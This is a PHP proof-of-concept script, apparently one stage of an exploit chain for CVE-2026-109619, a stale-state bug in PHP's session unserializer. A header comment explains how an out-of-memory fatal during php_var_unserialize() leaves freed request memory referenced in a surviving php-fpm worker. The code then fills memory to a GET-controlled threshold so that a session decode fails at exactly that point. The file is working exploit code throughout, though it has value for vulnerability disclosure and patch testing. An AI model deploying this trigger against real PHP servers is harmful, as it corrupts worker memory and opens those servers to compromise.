<?php
/* CVE-2026-109619 producer for poc-a3, unserializer stale-bookkeeping family.
 *
 * The generic unserializer keeps shared bookkeeping for serialized references
 * and values awaiting destruction (php_var_unserialize_init() publishes it in
 * Basic's globals BG(unserialize)). A fatal (OOM) inside the live decoder
 * skips php_var_unserialize_destroy(), so the request heap is freed while
 * BG(unserialize).data still points into it and the nesting level stays
 * nonzero. Because this fatal happens after successful request startup, the
 * worker survives on every SAPI including php-fpm, and the session RSHUTDOWN
 * that runs afterwards releases the session-file flock - only the
 * unserializer state stays stale (that is what the patch resets).
 *
 * Pad= leaves just enough room to read the session record built by sess.php
 * but not to decode it: the memory_limit fatal lands inside
 * php_var_unserialize() with the bookkeeping published. */
$pad_to = (int)($_GET['pad'] ?? 14500000); /* bytes left when session_start runs */
$limit = ini_parse_quantity(ini_get('memory_limit'));
$pad = str_repeat('P', max(0, $limit - memory_get_usage() - $pad_to));
session_id($_GET['sid'] ?? 'abcdef0123456789abcdef0123456789');
session_start();
printf("decode completed: %.1f MB session, pad %d bytes\n",
    strlen(session_encode()) / 1048576, strlen($pad));
